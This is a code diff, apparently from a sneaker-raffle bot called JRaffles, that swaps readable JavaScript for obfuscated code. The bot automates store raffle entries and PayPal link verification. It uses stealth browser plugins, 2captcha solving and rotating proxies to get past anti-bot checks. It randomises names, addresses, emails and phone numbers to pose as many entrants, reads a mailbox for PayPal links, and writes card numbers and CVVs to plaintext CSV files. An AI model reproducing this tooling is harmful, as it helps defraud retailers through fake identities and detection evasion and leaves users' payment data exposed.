-        console.log(`${getTime()} [${currentFunction}] Getting Session`);
-        // const newCookies = JSON.parse(fs.readFileSync('sessions/log.json'))
-
-        const page = await browser.newPage();
-        await page.authenticate({
-            username: `${proxySplit[2]}`,
-            password: `${proxySplit[3]}`,
-        });
-        // await page.setCookie(...newCookies);
-        await page.setViewport({ width: 560, height: 720 });
-        await page.goto('https://www.paypal.com/signin');
-        try {
-            console.log(`${getTime()} [${currentFunction}] Logging in to your Paypal account..`);
-            await page.waitForSelector('#email');
-            let value = await page.$eval('#email', el => el.getAttribute('value'));
-            if (value == '') {
-                await page.type('#email', paypalAccount.Email);
-                await delay(467);
-                let pw = await page.$('#splitPassword');
-                if (pw) {
-                    await page.click('#btnNext');
-                    await delay(2600);
-                }
-                await page.type('#password', paypalAccount.Password);
-                await delay(860);
-                await page.click('#btnLogin');
-
+            return _0x2f59da['data'];
+        } else {
+            if (_0x29f882 == 'pub') {
+                var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
+                    'name': 'JRaffles',
+                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
+                    'url': 'https://twitter.com/JRaffles_'
+                })['setThumbnail'](_0x2662c3['logo'])['addFields']({
+                    'name': 'Store',
+                    'value': '' + _0x2662c3['store'],
+                    'inline': !![]
+                }, {
+                    'name': 'Size',
+                    'value': '' + _0x526497['Size'],
+                    'inline': !![]
+                }, {
+                    'name': 'Delay',
+                    'value': '' + _0x51d52a['delay'],
+                    'inline': !![]
+                })['addFields']({
+                    'name': 'URL',
+                    'value': '||' + _0x526497['Url'] + '||'
+                })['setTimestamp']()['setFooter']({
+                    'text': 'JRaffles\x20v' + _0x3b2d4c,
+                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
+                });
+                return _0x2f59da['data'];
             } else {
-                await page.type('#password', paypalAccount.Password);
-                await delay(860);
-                await page.click('#btnLogin');
-
-            }
-
-            await page.waitForSelector('#reactContainer__balance', { timeout: 300000 });
-            console.log(`${getTime()} [${currentFunction}] Successfully logged in`);
-
-            await delay(10000);
-
-            // loginCookies = await page.cookies();
-            // fs.writeFileSync('sessions/log.json', `${JSON.stringify(loginCookies)}`);
-
-        } catch (e) {
-            throw new Error(`Login session expired ${e}`)
-        }
-        for (var i = 0; i < links.length; i++) {
-            console.log(`${getTime()} [${currentFunction}] Task ${i + 1} : Starting Verification`);
-
-            setTitle(`${currentFunction} Task ${i + 1} / ${links.length}`);
-            const newPage = await browser.newPage();
-            // await newPage.setCookie(...newCookies);
-            await newPage.goto(`${links[i]}`, { waitUntil: 'networkidle2' });
-            await delay(3000);
-            try {
-                const challenge = await newPage.$('#challenge-heading');
-                if (challenge) {
-                    console.log(`${getTime()} [${currentFunction}] Task ${i + 1} : ${chalk.yellow('2FA Required')}`);
-                    await newPage.waitForSelector('.CheckoutButton_buttonWrapper_2VloF', { timeout: 300000 })
-                    // await newPage.goto(`${links[i]}`);
-
+                if (_0x29f882 == 'acc' && !_0x28f60f) {
+                    var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
+                        'name': 'JRaffles',
+                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
+                        'url': 'https://twitter.com/JRaffles_'
+                    })['setThumbnail'](_0x2662c3['logo'])['addFields']({
+                        'name': 'User',
+                        'value': '' + _0x358285,
+                        'inline': !![]
+                    }, {
+                        'name': 'Store',
+                        'value': '' + _0x2662c3['store'],
+                        'inline': !![]
+                    }, {
+                        'name': 'Delay',
+                        'value': '' + _0x51d52a['delay'],
+                        'inline': !![]
+                    })['setTimestamp']()['setFooter']({
+                        'text': 'JRaffles\x20v' + _0x3b2d4c,
+                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
+                    });
+                    return _0x2f59da['data'];
+                } else {
+                    if (_0x29f882 == 'acc' && _0x28f60f) {
+                        var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
+                            'name': 'JRaffles',
+                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
+                            'url': 'https://twitter.com/JRaffles_'
+                        })['setThumbnail'](_0x2662c3['logo'])['addFields']({
+                            'name': 'User',
+                            'value': '' + _0x358285,
+                            'inline': !![]
+                        }, {
+                            'name': 'Error',
+                            'value': '' + _0x3a020e,
+                            'inline': !![]
+                        }, {
+                            'name': 'Store',
+                            'value': '' + _0x2662c3['store'],
+                            'inline': !![]
+                        }, {
+                            'name': 'Delay',
+                            'value': '' + _0x51d52a['delay'],
+                            'inline': !![]
+                        })['setTimestamp']()['setFooter']({
+                            'text': 'JRaffles\x20v' + _0x3b2d4c,
+                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
+                        });
+                        return _0x2f59da['data'];
+                    } else {
+                        if (_0x29f882 == 'open') {
+                            var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
+                                'name': 'JRaffles',
+                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
+                                'url': 'https://twitter.com/JRaffles_'
+                            })['setThumbnail'](_0x4f1e3f)['addFields']({
+                                'name': 'User',
+                                'value': '' + _0x358285,
+                                'inline': !![]
+                            })['setTimestamp']()['setFooter']({
+                                'text': 'JRaffles\x20v' + _0x3b2d4c,
+                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
+                            });
+                            return _0x2f59da['data'];
+                        } else {
+                            if (!_0x28f60f && _0x29f882 == 'ver') {
+                                var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
+                                    'name': 'JRaffles',
+                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
+                                    'url': 'https://twitter.com/JRaffles_'
+                                })['setThumbnail'](_0x2662c3['logo'])['addFields']({
+                                    'name': 'User',
+                                    'value': '' + _0x358285,
+                                    'inline': !![]
+                                }, {
+                                    'name': 'Store',
+                                    'value': '' + _0x2662c3['store'],
+                                    'inline': !![]
+                                }, {
+                                    'name': 'Delay',
+                                    'value': '' + _0x51d52a['delay'],
+                                    'inline': !![]
+                                })['setTimestamp']()['setFooter']({
+                                    'text': 'JRaffles\x20v' + _0x3b2d4c,
+                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
+                                });
+                                return _0x2f59da['data'];
+                            } else {
+                                if (_0x28f60f && _0x29f882 == 'ver') {
+                                    var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
+                                        'name': 'JRaffles',
+                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
+                                        'url': 'https://twitter.com/JRaffles_'
+                                    })['setThumbnail'](_0x2662c3['logo'])['addFields']({
+                                        'name': 'User',
+                                        'value': '' + _0x358285,
+                                        'inline': !![]
+                                    }, {
+                                        'name': 'Error',
+                                        'value': '' + _0x3a020e,
+                                        'inline': !![]
+                                    }, {
+                                        'name': 'Store',
+                                        'value': '' + _0x2662c3['store'],
+                                        'inline': !![]
+                                    }, {
+                                        'name': 'Delay',
+                                        'value': '' + _0x51d52a['delay'],
+                                        'inline': !![]
+                                    })['setTimestamp']()['setFooter']({
+                                        'text': 'JRaffles\x20v' + _0x3b2d4c,
+                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
+                                    });
+                                    return _0x2f59da['data'];
+                                }
+                            }
+                        }
+                    }
                 }
-                // console.log('after network')
-
-                // console.log('after waitfor')
-                await delay(40000);
-                await newPage.waitForSelector('#payment-submit-btn')
-                await newPage.$eval('#payment-submit-btn', button => button.click())
-                await newPage.click('#payment-submit-btn');
+            }
+        }
+    }
+}
+async function _0x2c2316(_0x4128f8, _0xeb2b1c) {
+    var _0x1b501c = _0x4128f8[_0xeb2b1c]['Address1']['split'](''), _0x8615c5 = _0x4128f8[_0xeb2b1c]['Address2']['split'](''), _0x18533a = _0x4128f8[_0xeb2b1c]['Email']['split']('@');
+    for (var _0x463bc2 = 0x0; _0x463bc2 < _0x1b501c['length']; _0x463bc2++) {
+        if (_0x1b501c[_0x463bc2] == 'X') {
+            var _0x574e84 = Math['round'](Math['random']() * (_0x58ad1a['length'] - 0x1));
+            _0x1b501c[_0x463bc2] = _0x492fe9[_0x574e84];
+        }
+    }
+    ;
+    for (var _0x463bc2 = 0x0; _0x463bc2 < _0x8615c5['length']; _0x463bc2++) {
+        if (_0x8615c5[_0x463bc2] == 'X') {
+            var _0x574e84 = Math['round'](Math['random']() * (_0x58ad1a['length'] - 0x1));
+            _0x8615c5[_0x463bc2] = _0x492fe9[_0x574e84];
+        }
+    }
+    ;
+    _0x4128f8[_0xeb2b1c]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x4128f8[_0xeb2b1c]['FirstName'] = _0x31b037['first']());
+    _0x4128f8[_0xeb2b1c]['LastName']['toUpperCase']() == 'RANDOM' && (_0x4128f8[_0xeb2b1c]['LastName'] = _0x31b037['last']());
+    _0x18533a[0x0]['toUpperCase']() == 'RANDOM' ? _0x18533a[0x0] = '' + _0x31b037['first']() + _0x31b037['last']() + _0x1053b1(0x1, 0x3e7) + '@' : _0x18533a[0x0] = _0x18533a[0x0] + '@';
+    _0x4128f8[_0xeb2b1c]['Email'] = _0x18533a['join'](''), _0x4128f8[_0xeb2b1c]['Address1'] = _0x1b501c['join'](''), _0x4128f8[_0xeb2b1c]['Address2'] = _0x8615c5['join']('');
+    _0x4128f8[_0xeb2b1c]['Phone'] == 'RANDOM' && (_0x4128f8[_0xeb2b1c]['Phone'] = '0' + _0x1053b1(0x5f5e100, 0x3b9ac9ff));
+    if (_0x4128f8[_0xeb2b1c]['Follower']['toUpperCase']() == 'RANDOM') {
+        var _0x4e8024 = _0x1053b1(0x1, 0x270f);
+        _0x4128f8[_0xeb2b1c]['Follower'] = '' + _0x31b037['first']() + _0x31b037['last']() + _0x4e8024 + '\x20';
+    }
+    _0x4128f8[_0xeb2b1c]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x4128f8[_0xeb2b1c]['HouseNumber'] = _0x1053b1(0x1, 0xc8));
+    if (_0x4128f8[_0xeb2b1c]['Address1']['toUpperCase']() == 'RANDOM') {
+        var _0x19c7d6 = Math['round'](Math['random']() * (_0x58ad1a['length'] - 0x1)), _0x559256 = _0x492fe9[_0x19c7d6];
+        _0x4128f8[_0xeb2b1c]['Address1'] = _0x31b037['last']() + 'straat', _0x4128f8[_0xeb2b1c]['Zip'] == '' && (_0x4128f8[_0xeb2b1c]['Postcode'] = _0x1053b1(0x3e8, 0x270f) + '\x20' + _0x559256 + _0x559256, _0x4128f8[_0xeb2b1c]['Zip'] = _0x4128f8[_0xeb2b1c]['Postcode']), _0x4128f8[_0xeb2b1c]['HouseNumber'] = '' + _0x1053b1(0x1, 0xc8);
+    }
+    return;
+}
+;
+async function _0x5925c7(_0x3e096d, _0x565647) {
+    _0x65e0bc['appendFileSync']('../failed-tasks.csv', _0x1f2aee() + ',' + _0x565647['store'] + ',' + _0x565647['name'] + ',' + _0x3e096d['Url'] + ',' + _0x3e096d['Size'] + ',' + _0x3e096d['Follower'] + ',' + _0x3e096d['FirstName'] + ',' + _0x3e096d['LastName'] + ',' + _0x3e096d['Address1'] + ',' + _0x3e096d['Address2'] + ',' + _0x3e096d['HouseNumber'] + ',' + _0x3e096d['Zip'] + ',' + _0x3e096d['City'] + ',' + _0x3e096d['State'] + ',' + _0x3e096d['Country'] + ',' + _0x3e096d['Phone'] + ',' + _0x3e096d['Email'] + ',' + _0x3e096d['Password'] + ',' + _0x3e096d['PaymentMethod'] + ',' + _0x3e096d['CardType'] + ',' + _0x3e096d['NameOnCard'] + ',' + _0x3e096d['CardNumber'] + ',' + _0x3e096d['ExpiryDate'] + ',' + _0x3e096d['CVV'] + ',' + _0x3e096d['IsBillingSame'] + ',,,,,,,,,,\x0a');
+}
+async function _0x523ce4(_0x554d25, _0x5f567b) {
+    _0x65e0bc['appendFileSync']('../successful-tasks.csv', _0x1f2aee() + ',' + _0x5f567b['store'] + ',' + _0x5f567b['name'] + ',' + _0x554d25['Url'] + ',' + _0x554d25['Size'] + ',' + _0x554d25['Follower'] + ',' + _0x554d25['FirstName'] + ',' + _0x554d25['LastName'] + ',' + _0x554d25['Address1'] + ',' + _0x554d25['Address2'] + ',' + _0x554d25['HouseNumber'] + ',' + _0x554d25['Zip'] + ',' + _0x554d25['City'] + ',' + _0x554d25['State'] + ',' + _0x554d25['Country'] + ',' + _0x554d25['Phone'] + ',' + _0x554d25['Email'] + ',' + _0x554d25['Password'] + ',' + _0x554d25['PaymentMethod'] + ',' + _0x554d25['CardType'] + ',' + _0x554d25['NameOnCard'] + ',' + _0x554d25['CardNumber'] + ',' + _0x554d25['ExpiryDate'] + ',' + _0x554d25['CVV'] + ',' + _0x554d25['IsBillingSame'] + ',,,,,,,,,,\x0a');
+}
+function _0x41c05d() {
+    let _0x467ce4 = proxyFile['split']('\x0a'), _0x50fd72 = _0x467ce4['map']((_0x395e45, _0x14c633) => {
+        sanatizeProxy = _0x395e45['replace']('\x0d', '');
+        if (_0x467ce4[_0x14c633 + 0x1] != undefined)
+            return '' + sanatizeProxy;
+        return '' + sanatizeProxy;
+    });
+    return _0x50fd72;
+}
+;
+async function _0x420bf9(_0x4ddb66, _0x18df90) {
+    if (_0x5a9a4a != 'yes')
+        var _0x5a9a4a = '', _0x4bbdfc = 0x0;
+    async function _0x1f2d6c() {
+        var _0x2fd97c = _0x65e0bc['readFileSync']('../accounts/paypal.csv', 'utf-8');
+        let _0x4da257 = _0x3e0e2d['parse'](_0x2fd97c, { 'header': !![] })['data'];
+        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
+        for (var _0x1ec924 = 0x0; _0x1ec924 < _0x4da257['length']; _0x1ec924++) {
+            console['log']('(' + _0x1ec924 + ')\x20' + _0x4da257[_0x1ec924]['Email']);
+        }
+        console['log']('\x0a(' + _0x4da257['length'] + ')\x20' + _0x1403a4['cyan']('Add\x20a\x20new\x20account'));
+        let _0x145e1f = await _0xab4dc6['get']('Option');
+        if (_0x145e1f['Option'] < _0x4da257['length'])
+            return _0x4da257[_0x145e1f['Option']];
+        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
+        let _0xd92109 = {}, _0x34fd8b = await _0xab4dc6['get']('Email');
+        _0xd92109['Email'] = _0x34fd8b['Email'];
+        var _0x503061 = Math['round'](Math['random']() * (_0x18df90['length'] - 0x1));
+        _0xd92109['Proxy'] = _0x18df90[_0x503061], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
+        let _0x2cfc24 = await _0xab4dc6['get']('Password');
+        return _0xd92109['Password'] = _0x2cfc24['Password'], _0x65e0bc['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0xd92109['Email'] + ',' + _0xd92109['Password'] + ',' + _0xd92109['Proxy']), _0xd92109;
+    }
+    let _0x5f12d0 = await _0x1f2d6c();
+    var _0x4cf437 = [];
+    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
+    let _0x4d7935 = await _0xab4dc6['get']('Amount'), _0x371b47 = _0x4d7935['Amount'];
+    async function _0x4d4b43() {
+        let _0x3b1853 = 0x0;
+        var _0x4cf171 = new _0x3e4e8d({
+            'user': _0x51d52a['masterMail'],
+            'password': _0x51d52a['masterPassword'],
+            'host': 'imap.gmail.com',
+            'port': 0x3e1,
+            'tls': !![],
+            'autotls': 'always'
+        });
+        function _0x477f19(_0x371c86) {
+            _0x4cf171['openBox']('INBOX', ![], _0x371c86);
+        }
+        _0x4cf171['once']('ready', function () {
+            _0x477f19(function (_0x45821a, _0x85de0b) {
+                console['clear'](), console['log']('Looking\x20For\x20Links');
+                if (_0x45821a)
+                    throw _0x45821a;
+                _0x4cf171['seq']['search']([
+                    'UNSEEN',
+                    [
+                        'SUBJECT',
+                        'PayPal'
+                    ]
+                ], function (_0x312fa7, _0x4e7b33) {
+                    if (!_0x4e7b33 || !_0x4e7b33['length'])
+                        console['log'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20No\x20mails\x20found'), _0x4cf171['end']();
+                    else {
+                        _0x4e7b33 = _0x4e7b33['slice'](0x0, _0x371b47);
+                        var _0x1c1c93 = _0x4cf171['seq']['fetch'](_0x4e7b33, {
+                            'bodies': '',
+                            'markSeen': !![]
+                        });
+                        _0x1c1c93['on']('message', function (_0x54ab6e, _0x7b82c6) {
+                            var _0x1ac5aa = '(#' + _0x7b82c6 + ')\x20';
+                            _0x54ab6e['on']('body', function (_0x284e18, _0x4c8233) {
+                                _0x300bc8(_0x284e18, (_0x5a1029, _0x401e98) => {
+                                    if (_0x401e98['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x401e98['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
+                                        mes = _0x401e98['text']['split']('[')[0x2];
+                                        var _0x45b4f3 = mes['split'](']')[0x0];
+                                        _0x4cf437['push'](_0x45b4f3);
+                                    }
+                                });
+                            }), _0x54ab6e['once']('end', function () {
+                                _0x3b1853++;
+                            });
+                        }), _0x1c1c93['once']('error', function (_0x5679f8) {
+                            console['log']('Fetch\x20error:\x20' + _0x5679f8);
+                        }), _0x1c1c93['once']('end', function () {
+                            _0x4cf171['end']();
+                        });
+                    }
+                });
+            });
+        }), _0x4cf171['once']('error', function (_0x7afdec) {
+            console['log'](_0x1403a4['red'](_0x7afdec['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
+        }), _0x4cf171['once']('end', async function () {
+        }), _0x4cf171['connect']();
+    }
+    try {
+        _0x4d4b43(), await _0x116d4a(0xfa0), console['log']('Found\x20' + _0x4cf437['length'] + '\x20Links\x20in\x20Mailbox');
+    } catch {
+        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x116d4a(0xfa0);
+    }
+    var _0x28f980;
+    _0x244762('' + _0x4ddb66);
+    var _0x5f4727 = _0x5f12d0['Proxy']['split'](':'), _0x4bbcb3;
+    try {
+        _0x4bbcb3 = await _0x5d136d['launch']({
+            'userDataDir': 'sessions/' + _0x5f12d0['Email'],
+            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+            'headless': ![],
+            'args': [
+                '--proxy-server=' + _0x5f4727[0x0] + ':' + _0x5f4727[0x1],
+                '--no-sandbox',
+                '--disable-setuid-sandbox'
+            ]
+        });
+    } catch {
+        _0x4bbcb3 = await _0x5d136d['launch']({
+            'userDataDir': 'sessions/' + _0x5f12d0['Email'],
+            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+            'headless': ![],
+            'args': [
+                '--proxy-server=' + _0x5f4727[0x0] + ':' + _0x5f4727[0x1],
+                '--no-sandbox',
+                '--disable-setuid-sandbox'
+            ]
+        });
+    }
+    try {
+        console['log'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Getting\x20Session');
+        const _0x2aad5e = await _0x4bbcb3['newPage']();
+        await _0x2aad5e['authenticate']({
+            'username': '' + _0x5f4727[0x2],
+            'password': '' + _0x5f4727[0x3]
+        }), await _0x2aad5e['setViewport']({
+            'width': 0x230,
+            'height': 0x2d0
+        }), await _0x2aad5e['goto']('https://www.paypal.com/signin');
+        try {
+            console['log'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x2aad5e['waitForSelector']('#email');
+            let _0x59f9ab = await _0x2aad5e['$eval']('#email', _0x599c1b => _0x599c1b['getAttribute']('value'));
+            if (_0x59f9ab == '') {
+                await _0x2aad5e['type']('#email', _0x5f12d0['Email']), await _0x116d4a(0x1d3);
+                let _0x14bfa9 = await _0x2aad5e['$']('#splitPassword');
+                _0x14bfa9 && (await _0x2aad5e['click']('#btnNext'), await _0x116d4a(0xa28)), await _0x2aad5e['type']('#password', _0x5f12d0['Password']), await _0x116d4a(0x35c), await _0x2aad5e['click']('#btnLogin');
+            } else
+                await _0x2aad5e['type']('#password', _0x5f12d0['Password']), await _0x116d4a(0x35c), await _0x2aad5e['click']('#btnLogin');
+            await _0x2aad5e['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Successfully\x20logged\x20in'), await _0x116d4a(0x2710);
+        } catch (_0x47f719) {
+            throw new Error('Login\x20session\x20expired\x20' + _0x47f719);
+        }
+        for (var _0x90f064 = 0x0; _0x90f064 < _0x4cf437['length']; _0x90f064++) {
+            console['log'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Task\x20' + (_0x90f064 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x244762(_0x4ddb66 + '\x20Task\x20' + (_0x90f064 + 0x1) + '\x20/\x20' + _0x4cf437['length']);
+            const _0x23a526 = await _0x4bbcb3['newPage']();
+            await _0x23a526['goto']('' + _0x4cf437[_0x90f064], { 'waitUntil': 'networkidle2' }), await _0x116d4a(0xbb8);
+            try {
+                const _0x554b16 = await _0x23a526['$']('#challenge-heading');
+                _0x554b16 && (console['log'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Task\x20' + (_0x90f064 + 0x1) + '\x20:\x20' + _0x1403a4['yellow']('2FA\x20Required')), await _0x23a526['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
+                await _0x116d4a(0x9c40), await _0x23a526['waitForSelector']('#payment-submit-btn'), await _0x23a526['$eval']('#payment-submit-btn', _0x1d6559 => _0x1d6559['click']()), await _0x23a526['click']('#payment-submit-btn');
                 try {
-                    await newPage.waitForSelector('img[alt="AFEW STORE"]');
-                    await delay(1500);
-                    console.log(chalk.green(`${getTime()} [${currentFunction}] Task ${i + 1} : Link Verified`));
-
-
-                } catch (e) {
-                    retry = 'yes'
-                    throw new Error(`Payment Rejected: ${e.message}`)
+                    await _0x23a526['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x116d4a(0x5dc), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Task\x20' + (_0x90f064 + 0x1) + '\x20:\x20Link\x20Verified'));
+                } catch (_0x2b640b) {
+                    _0x5a9a4a = 'yes';
+                    throw new Error('Payment\x20Rejected:\x20' + _0x2b640b['message']);
                 } finally {
-                    if (retry == 'yes' && t != 2) {
-                        console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                        i = i - 1;
-                        t = t + 1;
+                    if (_0x5a9a4a == 'yes' && _0x4bbdfc != 0x2) {
+                        console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x4ddb66['name'] + ']\x20Task\x20' + (_0x90f064 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4bbdfc + '\x20/\x205)')), _0x90f064 = _0x90f064 - 0x1, _0x4bbdfc = _0x4bbdfc + 0x1;
                         continue;
                     }
-                    if (retry == 'yes' && t >= 2) {
-                        errorLog(csv[i], currentFunction)
-                        retry = 'no';
-                        t = 0;
-                    }
-                    await newPage.close();
-                    await delay(18000)
+                    _0x5a9a4a == 'yes' && _0x4bbdfc >= 0x2 && (_0x5925c7(csv[_0x90f064], _0x4ddb66), _0x5a9a4a = 'no', _0x4bbdfc = 0x0), await _0x23a526['close'](), await _0x116d4a(0x4650);
                 }
-            } catch (e) {
-                console.log(chalk.red(`${getTime()} [${currentFunction}] Task ${i + 1} : ${e}`));
-
+            } catch (_0x163925) {
+                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Task\x20' + (_0x90f064 + 0x1) + '\x20:\x20' + _0x163925));
             }
-
         }
-
-    } catch (e) {
-        console.log(chalk.red(`${e}`))
+    } catch (_0x50cb41) {
+        console['log'](_0x1403a4['red']('' + _0x50cb41));
     } finally {
-        await browser.close();
-        // return menu();
+        await _0x4bbcb3['close']();
     }
-
 }
-
-
-
-
-
-
-const modules = [
+const _0x1a1b7d = [
     {
-        name: '4ELEMENTOS',
-        modules: [
+        'name': '4ELEMENTOS',
+        'modules': [
             {
-                name: '4ELEMENTOS Raffle Entries',
-                store: '4ELEMENTOS',
-                logo: 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
-                function: async function (currentFunction, csv, proxies) {
-                    puppeteer.use(StealthPlugin());
-                    puppeteer.use(RecaptchaPlugin({
-                        provider: {
-                            id: '2captcha',
-                            token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
+                'name': '4ELEMENTOS\x20Raffle\x20Entries',
+                'store': '4ELEMENTOS',
+                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
+                'function': async function (_0x4f3ce4, _0x4884d0, _0x560d23) {
+                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                        'provider': {
+                            'id': '2captcha',
+                            'token': '' + _0x51d52a['captchaKey']
                         },
-                        visualFeedback: true
-                    }))
-                    for (var i = 0; i < csv.length; i++) {
-                        if (retry != 'yes') {
-                            var retry = '';
-                            var t = 0;
-
-                        }
-                        var ERROR;
+                        'visualFeedback': !![]
+                    }));
+                    for (var _0x4d8bed = 0x0; _0x4d8bed < _0x4884d0['length']; _0x4d8bed++) {
+                        if (_0xa276b5 != 'yes')
+                            var _0xa276b5 = '', _0x39baf7 = 0x0;
+                        var _0x76967c;
                         try {
-                            await jig(csv, i);
-
+                            await _0x2c2316(_0x4884d0, _0x4d8bed);
                         } catch {
-                            retry = 'no';
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
+                            _0xa276b5 = 'no';
+                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                         }
-                        setTitle(`${currentFunction.name} Task ${i + 1} / ${csv.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-                        var sizeArray = [
-                            '40', '40,5', '41', '42', '42,5', '43', '44', '45', '45,5', '46', '47', '47,5', '48'
-                        ]
-                        var randomSize = Math.round(Math.random() * (sizeArray.length - 1));
-                        if (
-                            csv[i].Size == 'RANDOM'
-                        ) {
-                            csv[i].Size = sizeArray[randomSize]
-                        }
-                        var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                        var proxySplit = proxies[randomProxy].split(":");
-                        var browser;
+                        _0x244762(_0x4f3ce4['name'] + '\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20/\x20' + _0x4884d0['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
+                        var _0x24088c = [
+                            '40',
+                            '40,5',
+                            '41',
+                            '42',
+                            '42,5',
+                            '43',
+                            '44',
+                            '45',
+                            '45,5',
+                            '46',
+                            '47',
+                            '47,5',
+                            '48'
+                        ], _0xd4c1d0 = Math['round'](Math['random']() * (_0x24088c['length'] - 0x1));
+                        _0x4884d0[_0x4d8bed]['Size'] == 'RANDOM' && (_0x4884d0[_0x4d8bed]['Size'] = _0x24088c[_0xd4c1d0]);
+                        var _0x46e538 = Math['round'](Math['random']() * (_0x560d23['length'] - 0x1)), _0x394c30 = _0x560d23[_0x46e538]['split'](':'), _0x23ffef;
                         try {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
+                            _0x23ffef = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x394c30[0x0] + ':' + _0x394c30[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
                             });
-
                         } catch {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
+                            _0x23ffef = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x394c30[0x0] + ':' + _0x394c30[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
                             });
                         }
                         try {
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-
-                            const page = await browser.newPage();
-                            await page.authenticate({
-                                username: `${proxySplit[2]}`,
-                                password: `${proxySplit[3]}`,
-                            });
-                            await page.setRequestInterception(true);
-
-                            page.on("request", (req) => {
